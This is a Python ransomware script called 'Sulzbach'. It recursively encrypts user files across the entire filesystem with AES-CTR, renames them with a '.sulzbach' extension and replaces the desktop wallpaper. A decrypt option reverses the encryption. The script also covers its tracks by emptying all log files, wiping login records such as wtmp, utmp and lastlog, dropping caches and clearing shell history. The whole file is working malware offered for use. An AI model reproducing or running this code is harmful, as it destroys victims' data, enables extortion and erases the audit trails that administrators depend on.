#!/usr/bin/env python
from Cryptodome.Cipher import AES
from Cryptodome.Util import Counter
import argparse
import os

with open('temp.key', 'rb') as mykey:
    HARDCODED_KEY = mykey.read()


def get_parser():
    parser = argparse.ArgumentParser(description='Sulzbach')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser


def modify_file_inplace(filename, crypto, blocksize=16):
    with open(filename, 'r+b') as f:
        plaintext = f.read(blocksize)

        while plaintext:
            ciphertext = crypto(plaintext)
            if len(plaintext) != len(ciphertext):
                raise ValueError('''Ciphertext({})is not of the same length of the Plaintext({}).
                Not a stream cipher.'''.format(len(ciphertext), len(plaintext)))

            f.seek(-len(plaintext), 1)  # return to same point before the read
            f.write(ciphertext)

            plaintext = f.read(blocksize)


def discoverFiles(startpath):
    extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        'jpg', 'jpeg', 'bmp', 'gif', 'svg', 'psd', 'raw',  # images
        # 'png',  # images ignore
        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies

        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',  # OpenOffice, Adobe, Latex, Markdown, etc
        'yml', 'yaml', 'json', 'csv',  # structured data with no xml
        'db', 'sql', 'dbf', 'mdb', 'iso',  # databases and disc images

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web technologies
        # 'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
        'java', 'class', 'jar',  # java source code
        'ps', 'bat', 'vb',  # windows based scripts
        'awk', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
        'go', 'pyc', 'bf', 'coffee',  # other source code files

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
        'backup',  'bc',  # backup files
        # 'conf',  # configuration file
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path


def discoverFilesDecrypt(startpath):
    extensions = [
        'sulzbach',
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path


def discoverLog(startpath):
    extensions = [
        'log',
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        key = HARDCODED_KEY

        ctr = Counter.new(128)
        crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

        startdirs = ['/']

        for currentDir in startdirs:
            for file in discoverFilesDecrypt(currentDir):
                modify_file_inplace(file, crypt.encrypt)
                base = os.path.splitext(file)[0]
                os.rename(file, base)

    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

        ctr = Counter.new(128)
        crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

        startdirs = ['/']

        for currentDir in startdirs:
            for file in discoverFiles(currentDir):
                path = os.path.islink(file)
                if not path:
                    modify_file_inplace(file, crypt.encrypt)
                    os.rename(file, file + '.sulzbach')  # append filename to indicate crypted

        # change desktop wallpaper
        pathDefault = '/usr/share/backgrounds/c8/default/'
        pathAdditional = os.listdir(pathDefault)

        for a in pathAdditional:
            path = os.path.join(pathDefault, a)
            if os.path.isdir(path):
                path2 = os.listdir(path)
                for b in path2:
                    path3 = os.path.join(path, b)
                    os.remove(path3)
            os.system('cp temp.png ' + path + '/c8-hue-6.png')

        # covering tracks
        for currentDir in startdirs:
            for file in discoverLog(currentDir):
                os.system('echo > ' + file)
        os.system('echo > /var/log/wtmp; echo > /var/run/utmp; echo > /var/log/messages; echo > /var/log/maillog; '
                  'echo > /var/log/secure; echo > /var/log/lastlog')
        os.system('sync; echo 3 > /proc/sys/vm/drop_caches; '
                  'swapoff -a && swapon -a')  # clear PageCache, dentries and inodes.
        os.system('export HISTSIZE=0; export HISTFILE=/dev/null')
        os.system('history -c; history -w')  # clear history

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        # key = random(32)
        pass

    if not decrypt:
        pass
        # post encrypt stuff
        # desktop picture
        # icon, etc


if __name__ == "__main__":
    main()
